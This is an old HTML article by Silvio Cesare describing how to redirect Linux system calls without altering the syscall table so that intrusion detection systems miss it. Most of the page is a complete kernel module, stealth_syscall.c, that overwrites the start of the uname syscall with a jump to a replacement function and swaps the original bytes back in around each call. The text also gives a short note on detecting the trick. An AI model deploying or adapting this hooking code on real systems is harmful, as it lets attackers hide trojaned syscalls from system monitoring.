<html>

<head>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<title>HLP infection</title>
</head>

<body bgcolor="#FFFFFF" text="#000000">

<p align="left"><img src="syscall.gif"
alt="SYSCALL REDIRECTION WITHOUT MODIFYING THE SYSCALL TABLE" width="618" height="24"><small><small><font
face="Verdana"><br>
<br>
&nbsp;&nbsp;&nbsp; - Silvio Cesare &lt;silvio@big.net.au&gt;<br>
<br>
This article describes a technique of redirecting system calls without modifying the sys
call table (implemented in Linux). This can be used to evade intrusion detection systems
that use the sys call table to register redirected or trojaned system calls. It is however
an easy modifcation to make to detect the attack implemented in this article. The basic
premise behind this attack is to modify the old system call code to jump to the new system
call, thus control is transferred to the replacement system call and the sys call table is
left untouched. If this is the only procedure carried out, the old system call is left in
a clobbered state, and is dangerous to execute, so the original code is saved and when the
system call is made. The original code replaces the jump and the system call acts as
normal. After this, the jump can then be inserted (overwritten) again waiting for the next
use. Detecting this attack means that the first few bytes of the original system calls
should be saved and thencompared to verify that indeed the original system call is in
place.<br>
<br>
<br>
-- stealth_syscall.c (Linux 2.0.35)<br>
<br>
#include &lt;linux/config.h&gt;<br>
#include &lt;linux/kernel.h&gt;<br>
#include &lt;linux/module.h&gt;<br>
#include &lt;linux/version.h&gt;<br>
#include &lt;linux/utsname.h&gt;<br>
#include &lt;linux/string.h&gt;<br>
#include &lt;asm/string.h&gt;<br>
#include &lt;asm/unistd.h&gt;<br>
<br>
#define SYSCALL_NR __NR_uname<br>
<br>
static char syscall_code[7];<br>
static char new_syscall_code[7] =<br>
&nbsp;&nbsp;&nbsp; &quot;\xbd\x00\x00\x00\x00&quot;&nbsp;&nbsp;&nbsp; /*
&nbsp;&nbsp;&nbsp; movl $0,%ebp&nbsp;&nbsp;&nbsp; */<br>
&nbsp;&nbsp;&nbsp; &quot;\xff\xe5&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*
&nbsp;&nbsp;&nbsp; jmp *%ebp&nbsp;&nbsp;&nbsp; */<br>
;<br>
<br>
extern void *sys_call_table[];<br>
<br>
void *_memcpy(void *dest, const void *src, int size)<br>
{<br>
&nbsp;&nbsp;&nbsp; const char *p = src;<br>
&nbsp;&nbsp;&nbsp; char *q = dest;<br>
&nbsp;&nbsp;&nbsp; int i;<br>
<br>
&nbsp;&nbsp;&nbsp; for (i = 0; i &lt; size; i++) *q++ = *p++;<br>
<br>
&nbsp;&nbsp;&nbsp; return dest;<br>
}<br>
<br>
/*<br>
&nbsp;&nbsp;&nbsp; uname<br>
*/<br>
<br>
int new_syscall(struct new_utsname *buf)<br>
{<br>
&nbsp;&nbsp;&nbsp; printk(KERN_INFO &quot;UNAME - Silvio Cesare\n&quot;);<br>
&nbsp;&nbsp;&nbsp; _memcpy(<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sys_call_table[SYSCALL_NR], syscall_code,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sizeof(syscall_code)<br>
&nbsp;&nbsp;&nbsp; );<br>
&nbsp;&nbsp;&nbsp; ((int (*)(struct new_utsname *))sys_call_table[SYSCALL_NR])(buf);<br>
&nbsp;&nbsp;&nbsp; _memcpy(<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sys_call_table[SYSCALL_NR], new_syscall_code,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sizeof(syscall_code)<br>
&nbsp;&nbsp;&nbsp; );<br>
}<br>
<br>
int init_module(void)<br>
{<br>
&nbsp;&nbsp;&nbsp; *(long *)&amp;new_syscall_code[1] = (long)new_syscall;<br>
&nbsp;&nbsp;&nbsp; _memcpy(<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; syscall_code, sys_call_table[SYSCALL_NR],<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sizeof(syscall_code)<br>
&nbsp;&nbsp;&nbsp; );<br>
&nbsp;&nbsp;&nbsp; _memcpy(<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sys_call_table[SYSCALL_NR], new_syscall_code,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sizeof(syscall_code)<br>
&nbsp;&nbsp;&nbsp; );<br>
&nbsp;&nbsp;&nbsp; return 0;<br>
}<br>
<br>
void cleanup_module(void)<br>
{<br>
&nbsp;&nbsp;&nbsp; _memcpy(<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sys_call_table[SYSCALL_NR], syscall_code,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sizeof(syscall_code)<br>
&nbsp;&nbsp;&nbsp; );<br>
}<br>
<br>
</font></small></small></p>
</body>
</html>
